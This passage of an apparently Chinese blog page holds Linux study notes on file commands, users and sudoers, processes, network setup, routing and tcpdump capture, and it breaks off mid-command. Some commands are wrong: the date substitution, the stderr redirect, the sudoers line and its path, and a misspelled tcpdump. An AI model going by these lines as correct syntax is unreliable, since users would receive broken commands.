class="headerlink" title="管道文件（FIFO）"></a>管道文件（FIFO）</h3><pre><code class="hljs bash">管道文件，也称为命名管道，用于实现进程间的通信；提供半双工的通信方式，在Shell脚本和进程通信场景中使用。</code></pre><h3 id="链接文件（Symbolic-link）"><a href="#链接文件（Symbolic-link）" class="headerlink" title="链接文件（Symbolic link）"></a>链接文件（Symbolic link）</h3><pre><code class="hljs bash">软链接：例如 /bin -&gt; usr/bin硬链接：usr/bin复制代码</code></pre><h3 id="特殊文件（Special-file）"><a href="#特殊文件（Special-file）" class="headerlink" title="特殊文件（Special file）"></a>特殊文件（Special file）</h3><pre><code class="hljs 1c"><span class="hljs-string">&quot;/dev/null&quot;</span>文件：用于丢失数据<span class="hljs-string">&quot;/dev/zero&quot;</span>文件：用于产生全零数据<span class="hljs-string">&quot;/dev/random&quot;</span> 和 <span class="hljs-string">&quot;/dev/urandom&quot;</span>文件：用于产生随机数等复制代码</code></pre><h2 id="Linux-命令"><a href="#Linux-命令" class="headerlink" title="Linux 命令"></a>Linux 命令</h2><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1、创建文件</span><span class="hljs-built_in">touch</span> aa.txt <span class="hljs-comment"># 创建aa.txt文件</span><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; aa.txt <span class="hljs-comment">## 输入whoami文本到aa.txt文件中</span><span class="hljs-comment"># 2、显示文件内容（6个）：cat/more/less/head/tail</span><span class="hljs-comment"># 3、搜索、排序、去重（3个）：grep, sort, uniq</span><span class="hljs-comment"># 4、比较（2个）comm, diff</span><span class="hljs-comment"># 5、复制、删除、移动（3个）：cp/rm/mv</span><span class="hljs-comment"># 6、统计: wc</span><span class="hljs-comment"># 7、查找: find</span><span class="hljs-comment"># 8、打包、压缩、解压缩（3个）： bzip2/gzip/tar</span></code></pre><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span> <span class="hljs-comment"># 创建test目录</span><span class="hljs-built_in">mkdir</span> -p a/b/c <span class="hljs-comment"># 递归创建a,b,c层级目录</span><span class="hljs-built_in">rm</span> -r <span class="hljs-built_in">test</span> <span class="hljs-comment"># 删除test目录</span><span class="hljs-built_in">rm</span> -rf a/b/c <span class="hljs-comment"># 递归删除a,b,c层级目录</span></code></pre><h3 id="文件-目录"><a href="#文件-目录" class="headerlink" title="文件&amp;目录"></a>文件&amp;目录</h3><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> a <span class="hljs-built_in">test</span> <span class="hljs-comment"># 将 a 目录移动到 test下</span><span class="hljs-built_in">mv</span> a b <span class="hljs-comment"># 将a目录重命名为b目录</span><span class="hljs-built_in">cp</span> aa.txt <span class="hljs-built_in">test</span> <span class="hljs-comment"># 将aa.txt拷贝到test目录下</span><span class="hljs-built_in">cp</span> aa.txt <span class="hljs-built_in">test</span>\bb.txt <span class="hljs-comment"># # 将aa.txt拷贝到test下并重命名为bb</span><span class="hljs-built_in">cp</span> -r a <span class="hljs-built_in">test</span> <span class="hljs-comment"># 将a 目录复制到test目录下</span></code></pre><h3 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h3><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; aa.txt<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt;&gt; aa.txt<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\a&quot;</span> <span class="hljs-comment"># -e后面扩展字符</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;123\b123&quot;</span> <span class="hljs-comment"># \b删除前面一个字符</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;123\n123&quot;</span> <span class="hljs-comment"># \n 换行</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;123\r123&quot;</span> <span class="hljs-comment"># \r 回车</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;123\t123&quot;</span> <span class="hljs-comment"># \t 制表符</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\x61\t\x62\t\x63\t\x64\t\x65\t\x66&quot;</span> <span class="hljs-comment"># 16进制</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\e[1;33m whoami \e[0m&quot;</span> <span class="hljs-comment"># [1;33m 颜色</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\e[;31m \e[1:42m whoami \e[0m \e[0m&quot;</span> <span class="hljs-comment"># 括号</span><span class="hljs-built_in">echo</span> %(<span class="hljs-built_in">date</span> + <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>) <span class="hljs-comment"># 时间</span></code></pre><h3 id="cat-命令"><a href="#cat-命令" class="headerlink" title="cat 命令"></a>cat 命令</h3><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> aa.txt <span class="hljs-comment"># 查看文件内容</span><span class="hljs-built_in">cat</span> &gt; aa.txt <span class="hljs-comment"># 覆盖输入，按Ctrl + D结束</span><span class="hljs-built_in">cat</span> &gt;&gt; aa.txt <span class="hljs-comment"># 追加输入，按Ctrl + D结束</span><span class="hljs-built_in">cat</span> aa.txt bb.txt cc.txt &gt; dd.txt <span class="hljs-comment"># 将3个文件的内容写到dd.txt中</span></code></pre><h3 id="more-命令"><a href="#more-命令" class="headerlink" title="more 命令"></a>more 命令</h3><pre><code class="hljs bash">more <span class="hljs-comment"># 空格(或者d)向下翻页，b向上翻页，回车下一行，=显示当前行号</span>more -6 aa.txt <span class="hljs-comment"># 指定每一页显示6行 </span>more +6 aa.txt <span class="hljs-comment"># 从第6行开始显示</span></code></pre><h3 id="less-命令"><a href="#less-命令" class="headerlink" title="less 命令"></a>less 命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># 可以使用上下箭头来控制浏览内容</span>/a <span class="hljs-comment"># / 向下搜索内容a</span>?a <span class="hljs-comment"># ? 向上搜索内容a</span>less -i <span class="hljs-comment"># 忽略大小写</span>less -N aa.txt <span class="hljs-comment"># 显示行号，可以通过:跳转</span></code></pre><h3 id="group-命令（三剑客之一）"><a href="#group-命令（三剑客之一）" class="headerlink" title="group 命令（三剑客之一）"></a>group 命令（三剑客之一）</h3><pre><code class="hljs bash">ps -ef | grep python <span class="hljs-comment"># 搜索单词grep</span>ps -ef | grep python -c <span class="hljs-comment"># 查看单词grep的个数</span>ifconfig | grep ens33 <span class="hljs-comment"># 查找到ens33网卡行</span><span class="hljs-comment"># 常见用法</span><span class="hljs-built_in">cat</span> aa.txt | grep user <span class="hljs-comment"># 查询带user的行</span><span class="hljs-built_in">cat</span> aa.txt | grep -i user <span class="hljs-comment"># 不区分大小写</span><span class="hljs-built_in">cat</span> aa.txt | grep -v <span class="hljs-string">&quot;%&quot;</span> <span class="hljs-comment">#查看 aa.txt 文件中，不包含%的行</span><span class="hljs-built_in">cat</span> aa.txt | grep ^<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-comment"># 查看 # 号开头的行</span><span class="hljs-built_in">cat</span> aa.txt | grep ^[^1] <span class="hljs-comment"># 输出不是1开头的内容</span><span class="hljs-built_in">cat</span> aa.txt | grep y$ <span class="hljs-comment"># 查看y结尾的内容</span><span class="hljs-built_in">cat</span> aa.txt | grep ^$ <span class="hljs-comment"># 查看空行</span><span class="hljs-built_in">cat</span> aa.txt | grep ^[^$] <span class="hljs-comment"># 不要显示空行</span><span class="hljs-comment"># 扩展</span><span class="hljs-built_in">cat</span> aa.txt | grep -E <span class="hljs-string">&quot;a|b|c&quot;</span> <span class="hljs-comment"># 输出包含a,b,c开头的行</span><span class="hljs-built_in">cat</span> aa.txt | grep - </code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192252242.png" alt="img"></p><h3 id="wc-命令"><a href="#wc-命令" class="headerlink" title="wc 命令"></a>wc 命令</h3><pre><code class="hljs bash"><span class="hljs-comment"># 统计文件的字节数、字数、行数。</span><span class="hljs-comment"># wc [选项] [文件]</span><span class="hljs-built_in">wc</span> aa.txt行数单词数字节数文件名-c <span class="hljs-comment"># 统计字节数</span>-m <span class="hljs-comment"># 统计字符数</span>-l <span class="hljs-comment"># 统计行数</span>-w <span class="hljs-comment"># 统计字数</span></code></pre><h3 id="find-命令（重要）"><a href="#find-命令（重要）" class="headerlink" title="find 命令（重要）"></a>find 命令（重要）</h3><pre><code class="hljs bash">find / -iname <span class="hljs-built_in">test</span> <span class="hljs-comment"># 不区分大小写</span>find / -<span class="hljs-built_in">type</span> d -iname <span class="hljs-built_in">test</span> <span class="hljs-comment"># 目录类型，不区分大小写 </span>find / -<span class="hljs-built_in">type</span> f -perm 777 <span class="hljs-comment"># 查找777权限的文件</span>find / -<span class="hljs-built_in">type</span> l ! -perm 777 <span class="hljs-comment"># 查找不是777权限的连接文件</span>find / -<span class="hljs-built_in">type</span> f -empty <span class="hljs-comment"># 查找所有空文件</span>find / -user tss -name <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-comment"># 查找用户tss的所有文件</span>find / -user tss 2 &gt; null <span class="hljs-comment"># 将报错（返回2）的不要显示</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825192802954.png" alt="img"></p><h3 id="bzip2-gzip-打包-压缩（重要）"><a href="#bzip2-gzip-打包-压缩（重要）" class="headerlink" title="bzip2 | gzip 打包 &amp; 压缩（重要）"></a>bzip2 | gzip 打包 &amp; 压缩（重要）</h3><pre><code class="hljs bash"><span class="hljs-comment"># bzip2 -&gt; .bz2文件，v 是过程可视化，f 是强制解压（默认不保留源文件）</span>bzip2 aa.txt <span class="hljs-comment"># 压缩生成aa.txt.bz2，不保留原文件</span>bzip2 -k aa.txt <span class="hljs-comment"># 生成aa.txt.bz2，保留原文件</span>bzip2 -d aa.txt.bz2 <span class="hljs-comment"># 解压，压缩包不保留</span>bzip2 -t aa.txt.bz2 <span class="hljs-comment"># 检测压缩包是否有问题</span><span class="hljs-comment"># gzip -&gt; .gz文件，v 是过程可视化，f 是强制解压（默认不保留源文件）</span>gzip aa.txt bb.txt <span class="hljs-comment"># 分别压缩，生成2个压缩文件 aa.txt.gz, bb.txt.gz</span>gzip -l aa.txt.gz <span class="hljs-comment"># 列出压缩文件的内容信息</span>gzip -d aa.txt.gz <span class="hljs-comment"># 解压</span>gzip -r <span class="hljs-built_in">test</span> <span class="hljs-comment"># 递归压缩test目录下的aa.txt，bb.txt，cc.txt</span>gzip -rd <span class="hljs-built_in">test</span> <span class="hljs-comment"># 递归解压test目录下的压缩文件</span><span class="hljs-comment">## tar -&gt; .tar文件，f是一定要有的，c是创建，x是解压缩，v是可视化，t是查看压缩内容（默认保留源文件）</span><span class="hljs-comment"># z: gz格式</span><span class="hljs-comment"># j: bz2格式</span>tar -cvf aa.txt.tar aa.txttar -xvf aa.txt.tartar -czvf aa.txt.gz aa.txttar -xzvf aa.txt.gztar -cjvf aa.txt.bz2 aa.txttar -xjvf aa.txt.bz2</code></pre><h3 id="uname-命令"><a href="#uname-命令" class="headerlink" title="uname 命令"></a>uname 命令</h3><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> <span class="hljs-comment"># 显示linux</span><span class="hljs-built_in">uname</span> -a <span class="hljs-comment"># 查询系统所有的信息</span><span class="hljs-built_in">uname</span> -r <span class="hljs-comment"># 发行编号</span><span class="hljs-built_in">uname</span> -v <span class="hljs-comment"># 查看版本号</span><span class="hljs-built_in">uname</span> - io <span class="hljs-comment"># 操作系统名称</span></code></pre><h3 id="service-命令"><a href="#service-命令" class="headerlink" title="service 命令"></a>service 命令</h3><pre><code class="hljs bash">service [服务名] [start | stop | restart | reload | status]<span class="hljs-comment"># 在 Centos7.0 后，很多服务不在使用 `service`，而是是 `systemctl`</span></code></pre><h3 id="systemctl-命令"><a href="#systemctl-命令" class="headerlink" title="systemctl 命令"></a>systemctl 命令</h3><pre><code class="hljs bash">systemctl [optinons] <span class="hljs-built_in">command</span> [unit]<span class="hljs-comment"># options: -H, --host（指定systemd实例的主机名或者IP）</span>[start, stop, restart, reload, <span class="hljs-built_in">enable</span>, <span class="hljs-built_in">disable</span>, status, is-active, is-enable, mask, unmask等]systemctl show ServiceName <span class="hljs-comment"># 查看服务的内容</span>systemctl mask ServiceName <span class="hljs-comment"># 注销，不可以start，需要unmask</span>systemctl unmask ServiceName <span class="hljs-comment"># 取消注销</span></code></pre><h3 id="cut-命令"><a href="#cut-命令" class="headerlink" title="cut 命令"></a>cut 命令</h3><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> [选项参数] [filename]<span class="hljs-comment"># cut 命令，剪</span><span class="hljs-comment"># 文件aa.txt文件如下, 分隔符可以是空格，逗号等</span>123456<span class="hljs-comment"># cut -d &#x27;&#x27; -f 1 aa.txt</span>14<span class="hljs-comment"># cut -d &#x27;&#x27; -f 1-2 aa.txt</span>1245<span class="hljs-built_in">cut</span> -d : -f 1,3 /etc/passwd <span class="hljs-comment"># 只显示第1,3列</span></code></pre><h3 id="Linux-痕迹命令"><a href="#Linux-痕迹命令" class="headerlink" title="Linux 痕迹命令"></a>Linux 痕迹命令</h3><pre><code class="hljs bash">w <span class="hljs-comment"># 显示系统当前登录的用户信息，who命令信息文件（/var/run/utmp）</span><span class="hljs-built_in">who</span> <span class="hljs-comment"># 显示系统中正在使用的用户，包含ID，tty,IP，登录时间</span>last <span class="hljs-comment"># 查看用户近期登录信息</span><span class="hljs-built_in">tty</span> <span class="hljs-comment"># 查看当前登录的tty</span>lastlog <span class="hljs-comment"># 账号最后登录时间</span>lastb <span class="hljs-comment"># 登录错误记录</span><span class="hljs-built_in">logname</span> <span class="hljs-comment"># 查看原始登录的用户（切换用户的情况）</span></code></pre><h3 id="多命令执行方式"><a href="#多命令执行方式" class="headerlink" title="多命令执行方式"></a>多命令执行方式</h3><pre><code class="hljs bash"><span class="hljs-comment"># ; &amp;&amp; || 之间混合使用</span>command1; command2; command3 <span class="hljs-comment"># 顺序执行，命令中有错误也会执行后面</span>command1 &amp;&amp; command2 &amp;&amp; command3 <span class="hljs-comment"># 顺序执行，有错误后面不执行</span>command1 || command2 || command3 <span class="hljs-comment"># 命令1错误执行命令2，命令2错误执行命令3，命令1正确后面不执行</span>command1 | command2 | command3 <span class="hljs-comment"># 除了管道过滤作用 或 ，只显示最后一个命令的结果</span></code></pre><h3 id="vim-文件编辑"><a href="#vim-文件编辑" class="headerlink" title="vim 文件编辑"></a>vim 文件编辑</h3><pre><code class="hljs bash"><span class="hljs-comment"># 命令模式</span><span class="hljs-built_in">dd</span> <span class="hljs-comment"># 删除（剪切）</span>yy <span class="hljs-comment"># 复制</span>p <span class="hljs-comment"># 粘贴</span>u <span class="hljs-comment"># 撤销</span>ctrl + r <span class="hljs-comment"># 恢复撤销</span><span class="hljs-comment"># 末行模式</span>/^字符串 <span class="hljs-comment"># 向下查询字符串开头</span>?字符串&amp; <span class="hljs-comment"># 向上查询字符结尾，可以结合正则表达式</span>:<span class="hljs-built_in">set</span> nu <span class="hljs-comment"># 显示行号</span>:<span class="hljs-built_in">set</span> nonu <span class="hljs-comment"># 取消行号</span></code></pre><h2 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h2><pre><code class="hljs routeros">用户,<span class="hljs-attribute">UID</span>=1000-60000超级用户: root, <span class="hljs-attribute">ID</span>=0虚拟用户：1-999之间复制代码</code></pre><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment"># 查看用户的uid,gid,group</span><span class="hljs-comment"># 创建用户</span>useradd mz <span class="hljs-comment"># 创建用户</span>passwd mz <span class="hljs-comment"># 修改用户密码</span>su mz <span class="hljs-comment"># 切换用户</span><span class="hljs-comment"># 删除用户</span>userdel -rf mz <span class="hljs-comment"># 删除用户,f是强制删除（有进程），r是删除对应用户的家目录</span><span class="hljs-comment"># cat /etc/passwd</span>用户:密码:uid:gid:备注:家目录:shell_path<span class="hljs-comment"># cat /etc/shadow</span>用户:密码:修改时间:有效期<span class="hljs-comment"># /etc/sudoers 获取sudo的权限</span>root ALL=(ALL)ALL <span class="hljs-comment"># 方式1</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;userALL=(ALL)ALL&quot;</span> &gt; /etc/sudoers/sudoers.d/user_sudoers <span class="hljs-comment"># 方式2</span></code></pre><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/group</span>groupadd groupname1 <span class="hljs-comment"># 创建组</span>groupdel groupname1 <span class="hljs-comment"># 删除组</span>gpasswd -a user group <span class="hljs-comment"># 将user添加到group中</span>gpasswd -d user group <span class="hljs-comment"># 将user从group中删除</span></code></pre><h2 id="查看与终止进程"><a href="#查看与终止进程" class="headerlink" title="查看与终止进程"></a>查看与终止进程</h2><pre><code class="hljs bash"><span class="hljs-comment">## 查询进程</span>ps [参数]ps -aux <span class="hljs-comment"># 显示所有进程 以更详细的内容展示</span>ps -eftop <span class="hljs-comment"># 动态，每3秒刷新一次，当前时间，启动时间，系统负载，tasks:全部进程；p cpu, m 内存, q退出</span><span class="hljs-comment"># yum install -y lsof </span>lsof -i :22 <span class="hljs-comment"># 查看22端口的进程</span>lsof -i 192.168.16.ip <span class="hljs-comment"># 查看IP对应的端口进程</span>lsof -p 1283 <span class="hljs-comment"># 1283进程打开的文件</span><span class="hljs-comment">## 删除进程</span><span class="hljs-built_in">kill</span> 进程ID<span class="hljs-built_in">kill</span> -9 进程ID <span class="hljs-comment"># 强制删除</span>pkill -9 t pts/2 <span class="hljs-comment"># 删除pts</span>pkill -9 sshd <span class="hljs-comment"># 将所以这个服务的进程</span><span class="hljs-comment">## 场景</span>ping www.baidu.com &gt; ping.txt &amp; <span class="hljs-comment"># 后台运行</span><span class="hljs-built_in">jobs</span> <span class="hljs-comment"># 查看后台任务</span><span class="hljs-built_in">fg</span> 1 <span class="hljs-comment"># 1 编号是jobs命令查看的，fg将1编号的jobs调到前台运行，可以按Ctrl + Z暂停，或者Ctrl+C结束</span><span class="hljs-built_in">bg</span> 1 <span class="hljs-comment"># 将暂停的任务继续运行</span><span class="hljs-built_in">tail</span> -f ping.txt <span class="hljs-comment"># -f 循环查看</span></code></pre><h2 id="Linux-其他"><a href="#Linux-其他" class="headerlink" title="Linux 其他"></a>Linux 其他</h2><h3 id="Linux-系统下的通配符-（20个）"><a href="#Linux-系统下的通配符-（20个）" class="headerlink" title="Linux 系统下的通配符 （20个）"></a>Linux 系统下的通配符 （20个）</h3><pre><code class="hljs bash">* : 通配符，代表任意字符（0到多个）? : 通配符，代表一个字符<span class="hljs-comment"># : 注释</span>\ : 转义字符，将特殊字符或通配符还原成一般符号| : 分割两个管线命令的界定; : 连接性命令的界定~ : 用户的根目录$ : 变量前需要加的变量值! : 逻辑运算中的“非”/ : 路径分割符号&gt; : 输出导向，为“取代”&gt;&gt; : 输出导向， 为“累加”<span class="hljs-string">&#x27;&#x27;</span> : 不具有变量置换功能<span class="hljs-string">&quot;&quot;</span> : 具有变量置换功能`` : quote符号，两个 `` 中间为可以执行的指令() : 中间为子shell的起始与结束[] : 中间为字符组合&#123;&#125; : 中间为命令区块组合&amp; : 表示程序要在后台运行&amp;&amp; : 当该符号前一个指令执行成功时，执行后一个指令| : 管道符，表示上一条命令的输出，作为下一条命令参数进行传递|| : 表示前一条命令执行成功时，后一条命令不再执行；如果前面一条命令执行失败，后面的命令再执行</code></pre><h3 id="Linux系统下的常用快捷操作（七个）"><a href="#Linux系统下的常用快捷操作（七个）" class="headerlink" title="Linux系统下的常用快捷操作（七个）"></a>Linux系统下的常用快捷操作（七个）</h3><pre><code class="hljs bash">Ctrl + C <span class="hljs-comment"># 终止当前任务</span>Ctrl + D <span class="hljs-comment"># 输入结束（回到登录界面）</span>Ctrl + M <span class="hljs-comment"># 相当于Enter</span>Ctrl + S <span class="hljs-comment"># 暂停屏幕的输出</span>Ctrl + Q <span class="hljs-comment"># 恢复屏幕的输出</span>Ctrl + U <span class="hljs-comment"># 再提示符下，将整行命令删除</span>Ctrl + Z <span class="hljs-comment"># 暂停当前任务</span></code></pre><h2 id="Linux网络"><a href="#Linux网络" class="headerlink" title="Linux网络"></a>Linux网络</h2><pre><code class="hljs bash"></code></pre><h3 id="ifconfig-ip-ping"><a href="#ifconfig-ip-ping" class="headerlink" title="ifconfig &amp; ip &amp; ping"></a>ifconfig &amp; ip &amp; ping</h3><pre><code class="hljs bash"><span class="hljs-comment"># ifconfig</span>ifconfig -aifconfig -s <span class="hljs-comment"># 查看网络服务连接状态</span>ifconfig ens33 down <span class="hljs-comment"># 关闭网卡，IP地址没有了，网卡也没有了</span>ifconfig ens33 up <span class="hljs-comment"># 启动网卡</span>ifdown ens33 <span class="hljs-comment"># IP没有了，网卡还在</span>ifup ens33 <span class="hljs-comment"># </span><span class="hljs-comment"># ip</span>ip addr <span class="hljs-comment"># 查看IP地址</span>ip addr add 192.168.16.101/24 dev ens33 <span class="hljs-comment"># 临时添加IP地址，用于测试，重启就没有了</span>ip <span class="hljs-built_in">link</span> <span class="hljs-comment"># 查看当前设备情况</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 down <span class="hljs-comment"># 关闭网卡，网卡不在，</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 up <span class="hljs-comment"># 开启网卡</span>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> ens33 name ens32 <span class="hljs-comment"># 关闭网卡后，可以修改网卡名称，之后再启动</span><span class="hljs-comment"># ping</span>ping -c 5 www.baidu.comn <span class="hljs-comment"># 指定ping 次数</span>ping -s 1000 www.baidu.com <span class="hljs-comment"># 指定包大小</span></code></pre><h3 id="网络静态配置"><a href="#网络静态配置" class="headerlink" title="网络静态配置"></a>网络静态配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># 网卡配置目录</span>/etc/sysconfig/network-scripts/<span class="hljs-built_in">cp</span> ifcfg-ens33 ifcfg-ens33.bak <span class="hljs-comment"># 备份网卡</span><span class="hljs-comment"># vim ifcfg-ens33</span>TYPE=<span class="hljs-string">&quot;Ethernet&quot;</span> <span class="hljs-comment"># 以太网</span>PROXY_METHOD=<span class="hljs-string">&quot;none&quot;</span> <span class="hljs-comment"># 代理方法：关闭</span>BROWSER_ONLY=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-comment"># 仅仅是浏览器</span>BOOTPROTO=<span class="hljs-string">&quot;dhcp&quot;</span> <span class="hljs-comment"># 网卡协议</span>DEFROUTE=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-comment"># 默认路由</span>IPV4_FAILURE_FATAL=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-comment"># </span>IPV6INIT=<span class="hljs-string">&quot;yes&quot;</span>IPV6_AUTOCONF=<span class="hljs-string">&quot;yes&quot;</span>IPV6_DEFROUTE=<span class="hljs-string">&quot;yes&quot;</span>IPV6_FAILURE_FATAL=<span class="hljs-string">&quot;no&quot;</span>IPV6_ADDR_GEN_MODE=<span class="hljs-string">&quot;stable-privacy&quot;</span>NAME=<span class="hljs-string">&quot;ens33&quot;</span> <span class="hljs-comment"># 网卡名称</span>UUID=<span class="hljs-string">&quot;5b505e8a-35f2-4920-8241-edd9f3070780&quot;</span> <span class="hljs-comment"># 唯一标识码</span>DEVICE=<span class="hljs-string">&quot;ens33&quot;</span> <span class="hljs-comment"># 设备名称</span>ONBOOT=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-comment"># 是否激活</span><span class="hljs-comment"># 静态新加（DNS最多3个）</span>IPADDR=<span class="hljs-string">&quot;192.168.16.101&quot;</span>NETMASK=<span class="hljs-string">&quot;255.255.255.0&quot;</span>GATEWAY=<span class="hljs-string">&quot;192.168.16.2&quot;</span>DNS1=<span class="hljs-string">&quot;223.5.5.5&quot;</span> <span class="hljs-comment"># 阿里</span>DNS2=<span class="hljs-string">&quot;8.8.8.8&quot;</span> <span class="hljs-comment"># 谷歌</span>DNS3=<span class="hljs-string">&quot;192.168.16.2&quot;</span></code></pre><h3 id="route-路由配置"><a href="#route-路由配置" class="headerlink" title="route 路由配置"></a>route 路由配置</h3><pre><code class="hljs bash"><span class="hljs-comment"># route</span>ip route show <span class="hljs-comment"># 查看路由信息</span>route <span class="hljs-comment"># 显示路由 (default)</span>route -n <span class="hljs-comment"># -n是以数字的方式显示 (0.0.0.0)</span><span class="hljs-comment">## 添加路由</span><span class="hljs-comment"># sudo ip route add &lt;目标网络&gt; via &lt;网关IP&gt; dev &lt;接口&gt;</span><span class="hljs-built_in">sudo</span> ip route add 192.168.1.0/24 via 10.0.0.1 dev eth0<span class="hljs-comment"># 默认路由</span><span class="hljs-comment"># sudo ip route add default via &lt;网关IP&gt; dev &lt;接口&gt;</span><span class="hljs-built_in">sudo</span> ip route add default via 10.0.0.1<span class="hljs-comment">## 删除路由</span><span class="hljs-built_in">sudo</span> ip route del &lt;目标网络&gt; via &lt;网关IP&gt; <span class="hljs-comment"># sudo ip route del 192.168.1.0/24</span><span class="hljs-built_in">sudo</span> ip route del default <span class="hljs-comment"># 删除默认路由</span><span class="hljs-comment">## 测试路由是否生效，查看 8.8.8.8 路由路径</span>ip route get 8.8.8.8</code></pre><h3 id="DNS-检测-nslookup-tracert"><a href="#DNS-检测-nslookup-tracert" class="headerlink" title="DNS 检测- nslookup &amp; tracert"></a>DNS 检测- nslookup &amp; tracert</h3><pre><code class="hljs bash"><span class="hljs-comment"># nslookup # </span>nslookup www.baidu.com <span class="hljs-comment"># 返回域名对应的IP地址</span><span class="hljs-comment"># tracert # 跟踪</span>yum install -y traceroutetraceroute www.wangdun.cn<span class="hljs-comment"># cat /etc/resolv.conf</span><span class="hljs-comment"># Generated by NetworkManager</span>nameserver 223.5.5.5nameserver 8.8.8.8nameserver 192.168.16.2</code></pre><h3 id="网络监控-netstat-ss"><a href="#网络监控-netstat-ss" class="headerlink" title="网络监控 - netstat &amp; ss"></a>网络监控 - netstat &amp; ss</h3><pre><code class="hljs bash"><span class="hljs-comment"># netstat 查看网络连接</span>netstat -anpt <span class="hljs-comment"># 显示当前主机所有互动的,TCP协议</span>netstat -anpu <span class="hljs-comment"># 显示 UDP协议</span>netstat -lanpt <span class="hljs-comment"># 监听</span><span class="hljs-comment"># ss 查看网络连接2，高并发的场景</span>ss -anpt <span class="hljs-comment"># 和netstat差不多</span></code></pre><h2 id="抓包tcpdump"><a href="#抓包tcpdump" class="headerlink" title="抓包tcpdump"></a>抓包tcpdump</h2><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>yum install -y tcpdumptcpdump --v <span class="hljs-comment"># 查看版本</span><span class="hljs-comment"># 常用参数</span>-iinterface指定网卡-vv 显示更加详情的信息-e显示mac地址-wwrite 写入保存到文件中，导入的文件可以使用wireshark打开（例如: tcpdump -i ens33 -w <span class="hljs-built_in">test</span>）-r <span class="hljs-built_in">read</span> 读取文件中的数据（例：tcpdump -r [包文件名]）-c 在收到指定包数目之后，tcpdump就会停止（例：tcpdump -i ens33 -c 2）-n不把网络地址转换成名字-nn不进行端口名称的转换<span class="hljs-comment">## 过滤参数</span>tcpdump命令中几种关键词<span class="hljs-comment"># 类型关键词，包括: host, net,port</span><span class="hljs-comment"># 传输方向关键字，包括: src, dst</span><span class="hljs-comment"># 协议关键词，包括: ip, arp, tcp, udp等类型</span><span class="hljs-comment"># 其他协议关键字，包括: gateway, broadcast, less, greater, not, !, and, &amp;&amp;, or, ||</span>host: 根据主机IP来抓包src: 根据源IP地址来抓包dst: 根据目的IP地址来抓包port: 根据端口进行抓包net: 根据网段进行抓包protocol: 根据协议进行抓包protocol协议：tcp/udp/icmp/ip/arp/rarp/ether协议等icmp协议：ping命令mac地址：指定mac地址进行抓包src mac: 源mac, dst mac: 目的地址</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><pre><code class="hljs bash">tcpdump -i ens33 host 192.168.16.100tcpdump -ni ens33 host 192.168.16.100 <span class="hljs-comment"># 显示ip地址</span>tcpdump -vvni ens33 host 192.168.16.100 <span class="hljs-comment"># 显示更加详细的信息</span>tcpdump -vvnni ens33 host 192.168.16.100 <span class="hljs-comment"># 显示更加详细的信息，协议转换成端口</span>tcpdump -vvnni ens33 dst 192.168.16.100 <span class="hljs-comment"># 目的地址</span>tcpdump -vvnni ens33 src 192.168.16.100 <span class="hljs-comment"># 目的地址</span>tcpdump -vvnni ens33 port 22 -c 10 <span class="hljs-comment"># 指定端口和10个包</span>tcpdump -vvnni ens33 dst port 22 -c 10 <span class="hljs-comment"># 指定端口和10个包</span>tcpdump -vvnni ens33 src port 22 -c 10 <span class="hljs-comment"># 指定端口和10个包</span>tcpdump -vvnni ens33 src port 22 -c 10 -w tcpdump <span class="hljs-comment"># 输入到tcpdump文件</span>tcpdump -r tcpdump <span class="hljs-comment"># 读取tcpdump文件</span>tcpdump -nnr tcpdump <span class="hljs-comment"># 读取tcpdump文件，不显示ssh，显示22端口</span>tcpdump -vvnnr tcpdump <span class="hljs-comment"># 读取tcpdump文件，不显示ssh，显示22端口,显示详细信息</span>tcpdump -nnvvi ens33 -c 10 <span class="hljs-string">&#x27;((tcp)and(port 22)and(dst host 192.168.16.200)or(dst host 192.168.16.201))&#x27;</span>tcpdum -ei ens33 <span class="hljs-string">&#x27;((icmp)and(ether host 00:0c:29:19:f4:ac))&#x27;</span>tcpdum -vvnnei ens33 <span class="hljs-string">&#x27;((icmp)and(ether host 